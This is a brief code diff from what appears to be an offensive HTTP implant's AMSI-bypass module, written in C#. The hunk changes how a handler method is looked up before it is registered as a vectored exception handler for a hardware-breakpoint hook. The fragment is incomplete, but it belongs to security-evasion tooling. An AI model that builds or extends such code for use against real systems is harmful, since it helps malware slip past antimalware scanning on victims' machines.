@@ -25,7 +25,7 @@ namespace HTTPImplant.Modules
             WinAPI.CONTEXT64 ctx = new WinAPI.CONTEXT64();
             ctx.ContextFlags = WinAPI.CONTEXT64_FLAGS.CONTEXT64_ALL;
 
-            MethodInfo method = typeof(AmsiHBP).GetMethod(nameof(Handler), BindingFlags.Static | BindingFlags.Public);
+            MethodInfo method = typeof(AmsiHBP).GetMethod("Handler", BindingFlags.Static | BindingFlags.Public);
             IntPtr hExHandler = WinAPI.AddVectoredExceptionHandler(1, method.MethodHandle.GetFunctionPointer());
 
             // Saving our context to a struct
